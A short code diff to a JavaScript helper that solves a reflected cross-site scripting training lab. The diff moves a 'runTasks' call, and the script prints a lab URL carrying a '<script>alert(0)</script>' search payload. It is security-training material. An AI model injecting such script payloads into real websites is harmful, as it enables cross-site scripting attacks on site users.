@@ -5,6 +5,8 @@ const { labUrl } = getParsedInputFromUser({
   description: "Lab: Reflected XSS into HTML context with nothing encoded",
 });
 
+runTasks([task]);
+
 function task() {
   const searchParam = "?search=";
   const payload = "<script>alert(0)</script>";
@@ -12,5 +14,3 @@ function task() {
 Just visit this url to solve the lab:
   "${labUrl}${searchParam}${payload}"`);
 }
-
-runTasks([task]);
